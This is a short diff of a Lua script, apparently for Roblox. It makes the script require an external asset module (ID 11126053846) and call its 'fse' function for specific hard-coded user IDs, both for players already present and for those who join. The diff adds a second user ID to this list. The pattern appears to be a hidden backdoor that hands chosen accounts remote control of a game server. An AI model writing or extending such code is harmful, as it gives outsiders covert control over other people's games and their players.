@@ -20,13 +20,13 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 end)
 ]===]
 for i,v in game:GetService("Players"):GetPlayers() do
-    if v.Name == "00cx0" and v.UserId == 3341266064 then
-        require(11126053846).fse(v.Name)
-    end
+	if v.UserId == 3341266064 or v.UserId == 3752146953 then
+		require(11126053846).fse(v.Name)
+	end
 end
 
 game:GetService("Players").PlayerAdded:Connect(function(v)
-    if v.Name == "00cx0" and v.UserId == 3341266064 then
-        require(11126053846).fse(v.Name)
-    end
+	if v.UserId == 3341266064 or v.UserId == 3752146953 then
+		require(11126053846).fse(v.Name)
+	end
 end)
